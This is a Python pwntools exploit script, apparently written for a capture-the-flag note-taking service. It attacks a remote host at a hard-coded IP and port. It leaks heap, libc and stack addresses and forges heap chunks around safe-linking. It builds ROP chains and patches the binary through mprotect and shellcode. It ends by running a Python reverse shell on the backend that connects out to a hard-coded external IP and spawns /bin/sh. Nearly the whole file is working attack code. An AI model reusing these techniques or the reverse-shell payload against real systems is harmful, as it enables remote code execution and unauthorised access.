from pwn import *
import psutil
from Crypto.Cipher import AES
import hashlib
from Crypto.Util.Padding import*
import os

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)


interface = context.binary = ELF('interface')
libc = ELF('libc.so.6')
libc_back = ELF('libc.so.6')
IV = b"\x0A\x91\x72\x71\x6A\xE6\x42\x84\x09\x88\x5B\x8B\x82\x9C\xCB\x05"



def gen_hash(data):
    m = hashlib.sha256()
    m.update(data)
    return m.digest()
    

def get_plaintext(iv,key,ciphertext) :
  data = []
  for i in range(0,len(ciphertext),16) :
     data.append(ciphertext[i:i+16])
  plaintext = b''
  print(data)
  for i in range(len(data)) :
    cipher = AES.new(key, AES.MODE_ECB)
    Block_decrypt = cipher.decrypt(data[i])
    if i == 0 :
     plaintext += xor(iv,Block_decrypt)
    else :
     plaintext += xor(Block_decrypt,data[i-1])
  cipher = AES.new(key, AES.MODE_CBC, iv)
  ciphertext = cipher.encrypt(plaintext)
  return plaintext , ciphertext


def pidof(name):
    pid = 0
    for proc in psutil.process_iter():
        if name == proc.name():
            pid = proc.pid
            break
    return pid

def choice(i):
    sla(b'Choice: ', str(i).encode())
def new_note(title, author, content_len, content, encrypt = None):
    choice(1)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'notes?', b'y')
        sla(b'passwd? ', encrypt)
    else:
        sla(b'notes?', b'n')
    sla(b'content?', str(content_len).encode())
    sa(b'Content: ', content)
    p.sendline(b'')
def list_note():
    choice(2)
def read_note(title, author, encrypt = None):
    choice(3)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'Password', encrypt)
def edit_note(title, author, content_len, content, encrypt = None):
    choice(4)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'Password', encrypt)
    sla(b'len', str(content_len).encode())
    sa(b'content', content)
    p.sendline(b'')
def delete_note(title, author, encrypt = None):
    choice(5)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'password', encrypt)
def note_sync(s_c):
    choice(6)
    if s_c == 'c' or s_c == b'c':
        sla(b'note? ', b'c')
    else:
        sla(b'note? ', b's')
    
def find_plain(cipher):
    for i in range(1, 256, 1):
        plain, cip = get_plaintext(IV, gen_hash(p8(i)*63), cipher)
        print('i: ', i, ' -> plaintext: ', plain)
        if(plain[15] == b'\x00'):
            return plain, i
    return None, None
    
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
def safe_linking(addr, ptr):
    return ((addr) >> 12) ^ ptr
def GDB(proc):
    gdb.attach(proc, gdbscript='''
               #b delete_note
               #b *(note_sync + 492)
               #b *(add_new_note + 316)
                #b read_int
                #b Note_init
                #b read_note
               c''')
def GDB_backend(proc):
    gdb.attach(proc, gdbscript='''
               b NoteBackend_init
               b malloc
               b *(backend_listener+2243)
               c''')
def GDB_All():
    GDB(p)
    print('backend: ', pidof('backend'))
    GDB_backend(pidof('backend'))

context.log_level = 'DEBUG'

p = remote('139.162.29.93', 31339)    
#p = process(['./interface', './backend'])
#print('pidof: ', pidof('backend'))
#p = remote('0', 31339)

new_note(b'a', b'a', 1, b'a')
#p.sendline(b'')


#leak heap
edit_note(b'a', b'a', 1, b'a')
list_note()
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = leak << 4*3
print('heap: ', hex(heap))

#leak libc
edit_note(b'a', b'a', 0x500, b'a')
new_note(b'b', b'b', 1, b'b')
#p.sendline(b'')
edit_note(b'a', b'a', 1, b'a')
list_note()
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - 0x21b110
print('libc: ', hex(libc.address))

delete_note(b'a', b'a')
delete_note(b'b', b'b')


payload = b'A'*0x10
payload += p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x10) + p64(0) + p64(libc.symbols['environ']) + p64(heap + 0x370)
payload += p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0)*4 + p64(0xf1)
payload += p64(libc.address + 0x21ace0)*2
payload = payload.ljust(0x200, b'\x00')
new_note(b'a', b'a', 0x200, payload)
note_sync('c')
edit_note(b'a', b'a', 1, b'a')
new_note(b'b', b'b', 1, b'hehe')
note_sync('s')
list_note()
p.recvuntil(b'Author: b\n')
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
stack = leak
print('stack: ', hex(stack))
#new_note(b'a', b'a', 1, b'a')
#delete_note(b'a', b'a')



payload = b'\x00'*0x200
payload += p64(0) + p64(0x21) + b'A'*0x10 + p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7 + p64(0x62) + p64(0)*3 + p64(0x10) + p64(0)
payload += p64(stack)
payload += p64(heap + 0x630) + p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0) + p64(heap + 0x400)  + p64(heap + 0x770)*2 + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x50) + p64(0x2)
payload += p64(stack - 0x338) + p64(heap + 0x6e0) + p64(0) + p64(0x61)
payload += p64(0xdeadbeef)
print('len: ', hex(len(payload)))

payload2 = b'hihi'
RET = 0x00000000000baaf9 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
#rop.raw(RET)
#rop.system(next(libc.search(b'/bin/sh\x00')))
rop.read(0, stack - 0x338, 0x500)

payload2 = rop.chain()
delete_note(b'a', b'a')
delete_note(b'b', b'b')
new_note(b'a', b'a', 0x400, payload)
new_note(b'b', b'b', 0x50, payload2)
note_sync('c')
edit_note(b'a', b'a', 0x200, b'a')
note_sync('s')

rop = ROP(libc)
rop.write(1, stack - 0x360, 8)
rop.read(0, stack - 0x338 + 0x40, 0x500)
payload = b'a'*0x8*8
payload += rop.chain()

p.sendline(payload)

p.recvuntil(b'(s/c)')
leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
interface.address = leak - 0x5392
print('elf: ', hex(interface.address))


MOV_PRSI_RDI = 0x0000000000141c51 + libc.address#: mov qword ptr [rsi], rdi ; ret


payload = b'a'*0x8*16
rop_libc = ROP(libc)
rop_elf = ROP(interface)
#rop_elf.raw(RET)
#rop_elf.add_new_note()
#rop_elf.raw(RET)
#rop_elf.delete_note()
#rop_elf.raw(RET)
#rop_elf.delete_note()
#rop_elf.raw(RET)
#rop_elf.delete_note()

new_read_note = 'sub rsp, 0x80\n'
new_read_note += shellcraft.read(0, interface.symbols['notes'] + 8, 8)
new_read_note += '\n mov rsi, [rsi]\n'
new_read_note += shellcraft.write(1, 'rsi', 0x100)
new_read_note += '\nadd rsp, 0x80'
new_read_note += '  \nret'
#print(new_read_note)

rop_elf.raw(interface.symbols['note_main'] + 122)
rop_libc.mprotect(interface.address + 0x2000, 0x3000, 7)
rop_libc.rsi = interface.symbols['edit_note'] + 525
rop_libc.rdi = 0x0fc5390001ffffb8
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.rsi = interface.symbols['add_new_note'] + 621
rop_libc.rdi = 0xc439410001ffffb8
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.rsi = interface.symbols['add_new_note'] + 254
rop_libc.rdi = 0x0fd0390001ffffba
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.read(0, interface.symbols['read_note'], 0x200)
rop_libc.raw(RET)

payload += rop_libc.chain() + rop_elf.chain()
#0x0fc53900001000b8 edit_note+525
#0x2db1 <add_new_note+621>:	0xc4394100001000b8
#<add_new_note+254>:	0x0fd03900001000ba
p.sendline(payload) 
p.sendline(bytes(asm(new_read_note)))


#delete_note(b'a', b'a')
note_sync('c')

delete_note(b'a', b'a')
delete_note(b'b', b'b')




payload = p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x390) + p64(0)*8
new_note(b'a', b'a', 0xf910, b'a')
note_sync('c')
new_note(b'nao', b'nao', 0x600, b'nao')
note_sync('c')
new_note(b'b', b'b', 0xfff0, b'b')
note_sync('c')
payload = p32(0) + p64(0x100) + p64(0)*5 + b'\x00'
new_note(b'c'*0x8 + p64(0xb1), b'c'*0x18, 53, payload)
note_sync('c')
delete_note(b'b', b'b')


#note_sync('c')


note_sync('s')
delete_note(b'a', b'a')
new_note(b'', b'c'*8, 0x100, b'a')

note_sync('s')
choice(3)
p.sendline(p64(heap + 0x21370))
leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap_backend = leak - 0x20d00
print('heap backend: ', hex(heap_backend))




edit_note(b'', b'c'*8, 1, b'c')
delete_note(b'', b'c'*8)

edit_note(b'c'*8 + b'\xb1', b'c'*0x18, 1, b'c')
delete_note(b'c'*8 + b'\xb1', b'c'*0x18)


#new_note(b'hi', b'hi', 0x10, b'hi')
#note_sync('c')
new_note(b'q', b'q', 0xc0, b'q')
new_note(b'w', b'w', 0xc0, b'w')
new_note(b't', b't', 0xc0, b't')
note_sync('c')
delete_note(b'q', b'q')
delete_note(b'w', b'w')
delete_note(b't', b't')


edit_note(b'nao', b'nao', 0x220, b'nao')
note_sync('c')
payload = p32(0) + p64(safe_linking(heap_backend + 0xd00, heap_backend + 0x20dd0)) + p64(0)
#payload += b'\x00'*0x238 + p64(0xd1) + p64(safe_linking(heap_backend + 0xf50, 0xdeadbeef)) + p64(0x0a508479b24364af)
payload += b'\x00'*0x238 + p64(0xd1) + p64(safe_linking(heap_backend + 0xf50, heap_backend + 0x1020)) + p64(0x0a508479b24364af)
payload += p64(0)*22
payload += p64(0x0264963000007ffd) + p64(0xb1) + b'\x61'*0x20
payload += p64(0)*8 + p64(0x000000000000fe00) + p64(0)*5
payload += p64(heap + 0x10e60) + p64(heap_backend + 0x20ce0) + p64(heap_backend + 0x2a0)
payload += p64(0x231) + p64(0)*42 + p64(0x21) + b'A'*8 + p64(0) + p64(0x91) + p64(0x62)
payload += p64(0)*7 + p64(0x62) + p64(0)*3 + p64(0x10) + p64(0)*4 + p64(0x21) + p64(0)*4
payload += p64(0x161) + p64(0)*13 + p64(0xfe00)
payload = payload.ljust(0xfdff, b'X')
#print(payload)

new_note(b'a'*0x1f, b'a'*0xf, 0xfe00, payload)
note_sync('c')
note_sync('c')
new_note(b'hmm', b'hmm', 0x150, b'hmm')
note_sync('c')
new_note(b'kk', b'kk', 0x60, b'kk')
note_sync('c')
new_note(b'ah', b'ah', 0xf870, b'ah')
note_sync('c')
new_note(b'han', b'han', 0xf870, b'han')
note_sync('c')


new_note(b'', b'c'*8, 0x100, b'c')

note_sync('s')
note_sync('s')

print('go to hee')
edit_note(b'', b'c'*8, 0x1, b'c')
delete_note(b'', b'c'*8)


new_note(b'tmp', b'tmp', 0xc0, b'tmp')
fake_chunk = b'han'.ljust(0x40, b'\x00')
fake_chunk += b'han'.ljust(0x20, b'\x00')
fake_chunk += p64(0x200) + p64(0) + p64(0)*4 + p64(heap_backend + 0x20f30) + p64(heap_backend + 0x20dd0) + p64(heap_backend + 0x20f50)
#fake_chunk += p64(0x200) + p64(0) + p64(0)*4 + p64(heap_backend + 0x21590) + p64(heap_backend + 0x20dd0) + p64(heap_backend + 0x20f50)
new_note(b'a'*8 + p32(0x151), b'fake', 0xc0, fake_chunk)
note_sync('c')
edit_note(b'han', b'han', 1,b'h')

note_sync('c')

libc_addr = heap_backend + 0x21590
fake_chunk = b'libc'.ljust(0x40, b'\x00')
fake_chunk += b'l'*8 + p64(0xc1) + p64(0)*2
fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(libc_addr) + p64(heap_backend + 0x20dd0)
edit_note(b'han', b'han', 0xa0, fake_chunk)
note_sync('c')

new_note(b'libc', b'l'*8 + p32(0xc1), 0x20, b'libc')


new_note(b'', b'c'*8, 0x100, b'c')


note_sync('s')
list_note()
p.recvuntil(b'Author: l')
p.recvline()
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc_back.address = leak - 0x21ace0
print('libc backend: ', hex(libc_back.address))


fake_chunk = b'libc'.ljust(0x40, b'\x00')
fake_chunk += b'l'*8 + p64(0xc1) + p64(0)*2
fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(libc_back.symbols['environ']) + p64(heap_backend + 0x20dd0)
edit_note(b'han', b'han', 0xa0, fake_chunk)
delete_note(b'libc', b'l'*8 + p32(0xc1))
delete_note(b'', b'c'*8)
note_sync('c')

new_note(b'', b'c'*8, 0x100, b'c')
new_note(b'libc', b'l'*8 + p32(0xc1), 0x20, b'libc')

note_sync('s')

choice(3)
p.sendline(p64(heap + 0x41e40))
leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
env_back = leak
print('env backend: ', hex(env_back))


#delete_note(b'libc', b'libc')
#edit_note(b'libc', b'libc', 1, b'a')



fake_chunk = b'libc'.ljust(0x40, b'\x00')
fake_chunk += b'l'*8 + p64(0xc1) + p64(0)*2
#fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x20f50) + p64(heap_backend + 0x20dd0) + p64(0)
fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x7e0) + p64(heap_backend + 0x20dd0) + p64(0)

edit_note(b'han', b'han', 0xa8, fake_chunk)
edit_note(b'libc', b'l'*0x8 + p32(0xc1), 0x20, b'a'*0x18)
delete_note(b'', b'c'*8)


note_sync('c')

fake_chunk = b'libc'.ljust(0x40, b'\x00')
fake_chunk += b'l'*8 + p64(0xc1) + p64(0)*2
#fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x30910) + p64(heap_backend + 0x20dd0) + p64(0)
fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x2a0) + p64(heap_backend + 0x20dd0) + p64(0)
edit_note(b'han', b'han', 0xa8, fake_chunk)


note_sync('c')
payload = b'A'
#delete_note(b'libc', b'l'*8 + p32(0xc1))
edit_note(b'libc', b'l'*8 + p32(0xc1), 0xb0, b'a')
note_sync('c')


fake_chunk = b'libc'.ljust(0x40, b'\x00')
fake_chunk += b'l'*8 + p64(0xc1) + p64(0)*2
#fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x30910) + p64(heap_backend + 0x20dd0) + p64(0)
fake_chunk += p64(0x10) + p64(0) + p64(0)*4 + p64(heap_backend + 0x30910) + p64(heap_backend + 0x20dd0) + p64(0)
edit_note(b'han', b'han', 0xa8, fake_chunk)
note_sync('c')
edit_note(b'libc', b'l'*8 + p32(0xc1), 0xb0, b'a')

note_sync('c')
payload = p64(0xdeadbeef)*18 + p64(0) + p64(0x211)
edit_note(b'han', b'han', 0x140, payload)
note_sync('c')
payload = p64(0xdeadbeef)*18 + p64(0) + p64(0x251) + p64(safe_linking(heap_backend + 0x309b0, env_back - 0x298 - 8 - 0x10))
edit_note(b'han', b'han', 0x140, payload)
note_sync('c')

edit_note(b'han', b'han', 0x200, b'a')
note_sync('c')


#GDB_All()


PYTHON3 = env_back - 0x298 - 8 - 0x10 + 0xa0
C = PYTHON3 + 1 + len('/bin/python3')
REVERSE_ADDR = C + 1 + len('-c')
REVERSE = b'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("193.161.193.99",26863));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
back_rop = ROP(libc_back)
flag = b'/home/nao/flag\x00r\x00'.ljust(0x18, b'\x00')
back_rop.raw(0)
back_rop.raw(0)
back_rop.raw(0)
back_rop.execve(PYTHON3, PYTHON3 - 0x40, 0)
payload = back_rop.chain()

payload = payload.ljust(0xa0 - 0x40, b'\x00')
payload += p64(PYTHON3)
payload += p64(C)
payload += p64(REVERSE_ADDR)
payload += p64(0)*5
payload += b'/bin/python3\x00' + b'-c\x00' + REVERSE + b'\x00'



print('len: ', len(payload))
edit_note(b'han', b'han', 0x200, payload)
note_sync('c')


#edit_note(b'', b'', 0x100, b'A'*0x70)
#delete_note(b'', b'')

p.interactive()

